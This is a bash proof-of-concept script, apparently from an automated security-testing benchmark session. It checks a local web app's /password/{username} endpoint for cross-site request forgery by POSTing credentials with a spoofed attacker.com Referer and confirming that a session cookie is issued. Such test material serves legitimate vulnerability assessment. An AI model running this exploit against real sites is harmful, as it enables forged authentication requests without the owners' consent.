#!/bin/bash
# POC: Demonstrates CSRF vulnerability on /password/{username} endpoint by submitting password form from attacker origin without CSRF token validation
# Target: ./repo
# Created: 2025-11-07T16:42:21.717Z
# Session: benchmark-XBEN-001-24-mhp2ljz1

# CSRF POC for /password/{username} endpoint
# Demonstrates that password submission accepts requests from any origin without CSRF token validation

TARGET_HOST="${1:-localhost:8082}"
TARGET_URL="http://$TARGET_HOST"

echo "[*] CSRF Vulnerability POC: Password Endpoint"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Attempt password submission from attacker-controlled origin
echo "[*] Step 1: Submitting password form with attacker Referer header"
echo "[*] This simulates a CSRF attack where an attacker tricks a user into"
echo "[*] submitting a password form via a malicious webpage"
echo ""

# Perform the request and capture full response including headers
RESPONSE=$(curl -s -D - -X POST "$TARGET_URL/password/test" \
  -H "Referer: http://attacker.com/malicious.html" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test&user_id=10032&password=test" 2>&1)

echo "[*] Full Response:"
echo "$RESPONSE"
echo ""

# Parse the response
STATUS=$(echo "$RESPONSE" | head -1 | grep -oP 'HTTP/1\.[0-9]\s+\K[0-9]+')
HAS_SESSION=$(echo "$RESPONSE" | grep -i "set-cookie.*session" | wc -l)
LOCATION=$(echo "$RESPONSE" | grep -i "location:" | head -1)

echo "[*] Analysis:"
echo "[*] HTTP Status Code: $STATUS"
echo "[*] Session Cookie Set: $([ $HAS_SESSION -gt 0 ] && echo "YES" || echo "NO")"
echo "[*] Location Header: $LOCATION"
echo ""

# Check if vulnerable
if [[ "$STATUS" == "302" ]] && [[ $HAS_SESSION -gt 0 ]]; then
    echo "[✓] VULNERABILITY CONFIRMED: CSRF on Password Endpoint"
    echo "[✓] POST request from attacker origin (Referer: attacker.com) accepted"
    echo "[✓] No CSRF token was required or validated"
    echo "[✓] Valid session cookie was issued - authentication succeeded"
    echo "[✓] Attacker can force password submission without CSRF protection"
    exit 0
else
    echo "[✗] Unexpected result"
    echo "[✗] Status: $STATUS (expected 302)"
    echo "[✗] Session Set: $([ $HAS_SESSION -gt 0 ] && echo "YES" || echo "NO") (expected YES)"
    exit 1
fi